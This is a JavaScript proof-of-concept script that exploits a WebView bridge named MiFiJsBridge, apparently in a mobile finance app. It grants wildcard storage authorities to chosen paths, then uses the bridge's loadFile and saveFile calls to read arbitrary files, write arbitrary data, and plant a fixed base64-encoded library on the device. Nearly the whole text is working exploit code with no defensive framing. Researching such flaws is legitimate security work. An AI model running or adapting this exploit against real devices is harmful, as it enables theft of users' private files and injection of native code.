const FIXED_LIB_LEN = Number("383800");

const out = document.getElementById('out');
function log(x) {
  const s = (typeof x === 'string') ? x : JSON.stringify(x, null, 2);
  out.textContent += `[${new Date().toLocaleTimeString()}] ${s}\n`;
}

function invoke(feature, action, param) {
  const raw = window.MiFiJsBridge.invoke(feature, action, param, null);
  try { return JSON.parse(raw); } catch (_) { return { raw }; }
}
function lookup(feature, action) {
  return window.MiFiJsBridge.lookup(feature, action);
}
function ensureBridge() {
  if (!window.MiFiJsBridge) throw new Error('MiFiJsBridge missing');
  const lSet = lookup('Storage', 'setPreferenceV2');
  const lLoad = lookup('Storage', 'loadFile');
  const lSave = lookup('Storage', 'saveFile');
  log({ lookup: { setPreferenceV2: lSet, loadFile: lLoad, saveFile: lSave } });
  if (lSet !== 0 || lLoad !== 0 || lSave !== 0) {
    throw new Error('Storage unavailable. Check launch chain and _debug=true');
  }
}

function setMeta(path, format) {
  const meta = JSON.stringify({ format: Number(format), authorities: ['*'] });
  const p = JSON.stringify({ pref: 'hybrid_storage', content: { [path]: meta } });
  const r = invoke('Storage', 'setPreferenceV2', p);
  log({ setPreferenceV2: r });
}

function readAny() {
  try {
    ensureBridge();
    const p = document.getElementById('readPath').value.trim();
    const f = Number(document.getElementById('readFormat').value);
    if (!p) throw new Error('readPath empty');
    setMeta(p, f);
    const r = invoke('Storage', 'loadFile', p);
    log({ loadFile: r });
    if (r && r.code === 0 && r.content && typeof r.content.data === 'string' && f === 1) {
      try { log('binary bytes=' + atob(r.content.data).length); } catch (_) {}
    }
  } catch (e) {
    log('ERR(read): ' + e.message);
  }
}

function writeAnyFile() {
  try {
    ensureBridge();
    const p = document.getElementById('writePath').value.trim();
    const d = document.getElementById('writeData').value;
    const f = Number(document.getElementById('writeFormat').value);
    if (!p) throw new Error('writePath empty');
    const req = JSON.stringify({ name: p, data: d, format: f, authorities: ['*'] });
    const r = invoke('Storage', 'saveFile', req);
    log({ saveFile: r });
  } catch (e) {
    log('ERR(writeFile): ' + e.message);
  }
}

function writeAnyLib() {
  try {
    ensureBridge();
    const p = document.getElementById('libPath').value.trim();
    if (!p) throw new Error('libPath empty');
    const req = JSON.stringify({ name: p, data: FIXED_LIB_B64, format: 1, authorities: ['*'] });
    const r = invoke('Storage', 'saveFile', req);
    log({ saveLib: r });

    setMeta(p, 1);
    const verify = invoke('Storage', 'loadFile', p);
    if (verify && verify.code === 0 && verify.content && verify.content.data) {
      const n = atob(verify.content.data).length;
      log(`verify bytes=${n}, expected=${FIXED_LIB_LEN}, match=${n === FIXED_LIB_LEN}`);
    } else {
      log({ verifyLoadFile: verify });
    }
  } catch (e) {
    log('ERR(writeLib): ' + e.message);
  }
}

document.getElementById('btnRead').addEventListener('click', readAny);
document.getElementById('btnWriteFile').addEventListener('click', writeAnyFile);
document.getElementById('btnWriteLib').addEventListener('click', writeAnyLib);
log('PoC loaded');
